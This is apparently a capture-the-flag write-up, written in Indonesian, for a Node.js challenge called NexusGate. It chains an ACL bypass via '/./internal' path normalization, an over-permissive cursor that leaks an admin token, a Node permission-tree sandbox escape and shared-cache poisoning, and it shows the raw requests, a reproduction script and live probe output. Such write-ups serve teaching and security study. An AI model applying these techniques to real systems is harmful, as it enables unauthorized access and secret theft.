# NexusGate — Analisis

[← Overview](50-nexusgate.md) · [Index](index.md)

### 2.1 ACL bypass: raw `req.url` vs `new URL()`

`proxy.js`:

```js
const server = http.createServer({ maxHeaderSize: 128 * 1024 }, (req, res) => {
  // ---- 1. path ACL ----
  if (req.url.startsWith('/internal/')) {
    res.writeHead(403, { 'content-type': 'text/plain' });
    res.end('forbidden');
    return;
  }
  ...
  const breq = http.request({
    host: BACKEND_HOST,
    port: BACKEND_PORT,
    method: req.method,
    path: req.url,          // raw, mis. /./internal/...
    headers,
    agent,
  }, ...);
  req.pipe(breq);
});
```

Backend `routes.js`:

```js
function handleRequest(req, res) {
  const url = new URL(req.url, 'http://127.0.0.1:8080');
  const pathname = url.pathname;
  ...
  if (pathname === '/internal/console/cursor') { ... }
}
```

- Proxy melihat `req.url = "/./internal/console/cursor"` → tidak diawali `/internal/` → **lolos**.
- Backend memanggil `new URL("/./internal/console/cursor", ...)` → WHATWG URL parser menghapus segmen `.` → `pathname = "/internal/console/cursor"` → **route internal dieksekusi**.
- Ini adalah perbedaan parser klasik: string prefix check vs URL normalization.

Raw request:

```http
GET /./internal/console/cursor?id=x HTTP/1.1
Host: s1.nfx.my.id:49535
Connection: close
```

Respons mentah (chunked):

```text
HTTP/1.1 400 Bad Request
content-type: application/json; charset=utf-8
...
{"err":"no such cursor"}
```

### 2.2 Cursor over-grant → PHASE_TOKEN

`routes.js`:

```js
if (pathname === '/internal/console/cursor') {
  if (req.method === 'POST') {
    const id = url.searchParams.get('id');
    const owner = url.searchParams.get('owner') || '';
    if (!id) return json(400, { err: 'id required' });
    cursors.set(id, tagStore.iterate`SELECT * FROM vault WHERE owner = ${owner}`);
    json(200, { ok: true });
    return;
  }
  if (req.method === 'GET') {
    const id = url.searchParams.get('id');
    const juser = url.searchParams.get('journal');
    const it = cursors.get(id);
    if (!it) return json(400, { err: 'no such cursor' });
    const r = it.next();
    if (r.done) return json(200, { done: true });
    const row = r.value;
    if (juser) journal(juser, `vault row: owner=${row.owner} secret=${row.secret}`);
    json(200, { done: false, owner: row.owner });
    return;
  }
}
```

Masalah:
- `owner` berasal dari user, bukan dari session. Penyerang dapat membuat cursor `owner=admin`.
- `journal` juga berasal dari user; endpoint GET menulis **secret** row ke journal user tersebut.
- `db.js` menyimpan `PHASE_TOKEN` sebagai secret admin:

```js
const PHASE_TOKEN = crypto.randomBytes(16).toString('hex');
...
db.prepare('INSERT INTO vault VALUES (?, ?)').run('admin', PHASE_TOKEN);
```

Dengan dua request:

```http
POST /./internal/console/cursor?id=c1&owner=admin
-> {"ok":true}

GET /./internal/console/cursor?id=c1&journal=<user>
-> {"done":false,"owner":"admin"}
```

Audit user `<user>` sekarang berisi:

```text
vault row: owner=admin secret=391ed5122926c01beeaa3d682662552c
```

`GET /audit` (JSON) mengembalikan journal tersebut. Token ini adalah `PHASE_TOKEN` yang dibutuhkan endpoint file.

### 2.3 File-read sandbox: Node permission tree

`routes.js`:

```js
if (pathname === '/internal/console/files' && req.method === 'POST') {
  readBody((body) => {
    const { token, path: filePath, journal: juser } = parseBody(body);
    if (token !== PHASE_TOKEN) return json(403, { err: 'invalid token' });
    if (!filePath) return json(400, { err: 'path required' });
    const out = spawnSync(process.execPath, [
      '--permission',
      '--allow-fs-read=/app/data/bot1.json',
      '--allow-fs-read=/app/data/bot2.json',
      '--allow-fs-read=/app/data/bot3.json',
      '-e',
      'try{console.log(require("fs").readFileSync(process.env.NX_TARGET,"utf8"))}catch(e){console.log("ERR:"+e.code)}',
    ], {
      env: { NX_TARGET: filePath, PATH: process.env.PATH },
      encoding: 'utf8',
      timeout: 5000,
    });
    const text = (out.stdout || '').trim() || (out.stderr || '').trim();
    if (juser) journal(juser, `file read: ${filePath} -> ${text}`);
    json(200, { ok: true });
  });
  return;
}
```

Allow-list hanya tiga file. Namun Node 24.14.0 memiliki perilaku permission tree: ketika beberapa path di-allow, node prefix bersama dari path-path itu menjadi “directory” yang readable. Common prefix dari:

```text
/app/data/bot1.json
/app/data/bot2.json
/app/data/bot3.json
```

adalah `/app/data/bot`. File `/app/data/bot` ditulis oleh bot:

`bot.js`:

```js
const nonce = crypto.randomBytes(8).toString('hex');
const req = http.get({
  host: '127.0.0.1',
  port: 80,
  path: `/tickets/latest?aud=${nonce}`,
  headers: { cookie: botCookie, 'user-agent': 'nx-audit-bot/1.0',
             accept: 'text/html,application/xhtml+xml' },
}, (res) => {
  res.resume();
  res.on('end', () => {
    try { fs.writeFileSync('/app/data/bot', nonce); } catch (_) {}
  });
});
```

Jadi `/app/data/bot` berisi nonce terakhir yang dipakai bot.

Kami mereproduksi perilaku ini secara lokal dengan Node v24.14.0:

```bash
N=/tmp/opencode/node-v24.14.0-linux-x64/bin/node
mkdir -p /tmp/opencode/ngtest/data
cd /tmp/opencode/ngtest
echo '{"shard":1}' > data/bot1.json
echo '{"shard":2}' > data/bot2.json
echo '{"shard":3}' > data/bot3.json
printf 'deadbeefcafebabe' > data/bot

NX_TARGET=/tmp/opencode/ngtest/data/bot \
$N --permission \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot1.json \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot2.json \
   --allow-fs-read=/tmp/opencode/ngtest/data/bot3.json \
   -e 'try{console.log(require("fs").readFileSync(process.env.NX_TARGET,"utf8"))}catch(e){console.log("ERR:"+e.code)}'
```

Output:

```text
deadbeefcafebabe
```

Dengan hanya satu allow-list entry, `/data/bot` ditolak; dengan tiga entry yang berbagi prefix, `/data/bot` diterima. Ini membuktikan root cause “permission tree” dan bukan sekadar tebakan.

Probe pada instance live:

```text
file read: /app/data/bot -> f0f6801a74026cf1
file read: /app/data/bo -> ERR:ERR_ACCESS_DENIED
file read: /app/data/b -> ERR:ERR_ACCESS_DENIED
file read: /app/data/bot1.json -> {"shard":1}
file read: /app/data/bot1.jso -> ERR:ERR_ACCESS_DENIED
file read: /app/data/botX -> ERR:ERR_ACCESS_DENIED
file read: /app/data/bot1.jsonX -> ERR:ERR_ACCESS_DENIED
file read: /app/data -> ERR:ERR_ACCESS_DENIED
```

### 2.4 Shared cache → MASTER_TICKET

`proxy.js`:

```js
const ticketClient = new Client(BACKEND_ORIGIN);
const ticketDispatcher = ticketClient.compose(interceptors.cache());
...
if (req.method === 'GET' && req.url.startsWith('/tickets/')) {
  ticketDispatcher.request({
    origin: BACKEND_ORIGIN,
    path: req.url,
    method: req.method,
    headers: rebuildHeaders(req),
  }).then((r) => {
    res.writeHead(r.statusCode, r.headers);
    r.body.pipe(res);
  })...
}
```

- Bot admin meminta `/tickets/latest?aud=<nonce>` dengan cookie admin.
- `undici` cache interceptor menyimpan respons HTML admin untuk URL tersebut.
- Cache tidak membedakan pemilik cookie; penyerang yang meminta URL **yang sama** (nonce diketahui dari `/app/data/bot`) mendapatkan HTML admin dari cache.
- HTML admin berisi ticket:

`views.js`:

```js
const inner = user === 'admin'
  ? `<p ...>Master service authorization ticket:</p>
     ...
     <span class="ticket ...">${esc(masterTicket)}</span>
     ...
     <meta name="nx-ticket" content="${esc(masterTicket)}">`
  : `... No active master ticket ...`;
```

- `POST /flag` membandingkan `ticket === MASTER_TICKET`.

### 2.5 Rantai penuh

```text
ACL bypass (/./internal)
  -> cursor owner=admin
  -> journal=<user> membocorkan PHASE_TOKEN
  -> /internal/console/files membaca /app/data/bot (nonce)
  -> GET /tickets/latest?aud=<nonce> dari cache = HTML admin
  -> ambil MASTER_TICKET
  -> POST /flag {"ticket": ...} = flag
```
